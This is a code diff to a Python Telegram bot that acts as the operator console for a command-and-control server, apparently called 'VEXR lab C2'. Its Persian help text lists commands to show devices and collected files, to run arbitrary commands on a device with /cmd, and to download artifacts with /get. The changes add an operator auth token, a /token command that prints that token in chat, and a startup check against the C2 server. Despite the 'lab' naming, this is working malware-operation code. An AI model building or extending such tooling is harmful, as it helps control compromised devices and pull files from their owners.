@@ -62,6 +62,10 @@ C2_URL = os.environ.get(
     "VEXR_C2_URL", "https://vexr-lab-c2-academic-production.up.railway.app"
 ).rstrip("/")
 
+# The operator API is private; the web service passes its token to this
+# process, and a standalone run reads the same env var.
+API_TOKEN = os.environ.get("VEXR_OPERATOR_TOKEN", "").strip()
+
 # Optional. Needed where api.telegram.org is blocked, e.g. socks5://127.0.0.1:10808
 TELEGRAM_PROXY = os.environ.get("TELEGRAM_PROXY", "").strip()
 
@@ -113,11 +117,14 @@ class C2Error(RuntimeError):
 class C2Client:
     """One shared connection pool for the whole bot lifetime."""
 
-    def __init__(self, base_url: str) -> None:
+    def __init__(self, base_url: str, token: str = "") -> None:
+        headers = {"User-Agent": "vexr-lab-bot/1.0"}
+        if token:
+            headers["X-Auth-Token"] = token
         self._http = httpx.AsyncClient(
             base_url=base_url,
             timeout=httpx.Timeout(15.0, connect=5.0),
-            headers={"User-Agent": "vexr-lab-bot/1.0"},
+            headers=headers,
         )
 
     async def close(self) -> None:
@@ -371,7 +378,8 @@ START_TEXT = (
     "از دکمه‌های پایین استفاده کن، یا:\n\n"
     "/stats — وضعیت سرور\n"
     "/devices — لیست دستگاه‌ها\n"
-    "/files — آخرین فایل‌ها\n\n"
+    "/files — آخرین فایل‌ها\n"
+    "/token — توکن ورود داشبورد\n\n"
     "دستور مستقیم:\n"
     "/cmd &lt;device_key&gt; &lt;command&gt;\n"
     "/get &lt;artifact_id&gt;"
@@ -485,6 +493,21 @@ async def send_artifact(message: Message, c2: C2Client, artifact_id: int) -> Non
 @dp.message(CommandStart())
 async def on_start(message: Message) -> None:
     await message.answer(START_TEXT, reply_markup=MAIN_KEYBOARD)
+
+
+@dp.message(Command("token"))
+async def on_token(message: Message, operator_token: str) -> None:
+    if not operator_token:
+        await message.answer(
+            "توکن اپراتور تنظیم نشده. در سرویس Railway متغیر "
+            "<code>VEXR_OPERATOR_TOKEN</code> را بگذار."
+        )
+        return
+    await message.answer(
+        "🔑 <b>توکن داشبورد</b>\n"
+        f"<code>{esc(operator_token)}</code>\n\n"
+        "در صفحهٔ ورود داشبورد بگذار، بعد این پیام را پاک کن."
+    )
 
 
 @dp.message(Command("stats"))
@@ -614,12 +637,17 @@ def make_bot() -> Bot:
     )
 
 
-async def _run_once(base_url: str) -> None:
+async def _run_once(base_url: str, api_token: str) -> None:
     bot = make_bot()
-    c2 = C2Client(base_url)
+    c2 = C2Client(base_url, api_token)
     dp["c2"] = c2
+    dp["operator_token"] = api_token
     try:
         me = await bot.get_me()
+        # Prove the operator token before polling: a misconfigured second
+        # instance must fail here instead of stealing Telegram updates and
+        # then erroring on every button.
+        await c2.stats()
         log.info(
             "connected as @%s (id=%s) · c2=%s · allowed=%s",
             me.username,
@@ -637,7 +665,11 @@ async def _run_once(base_url: str) -> None:
         log.info("telegram bot stopped")
 
 
-async def serve(base_url: str | None = None, retry: bool = True) -> None:
+async def serve(
+    base_url: str | None = None,
+    token: str | None = None,
+    retry: bool = True,
+) -> None:
     """Poll Telegram until cancelled.
 
     Called by ``python bot.py`` and by the web service, which runs it as a
@@ -654,10 +686,11 @@ async def serve(base_url: str | None = None, retry: bool = True) -> None:
         )
 
     target = base_url or C2_URL
+    api_token = token if token is not None else API_TOKEN
     delay = 5
     while True:
         try:
-            await _run_once(target)
+            await _run_once(target, api_token)
             return
         except asyncio.CancelledError:
             raise
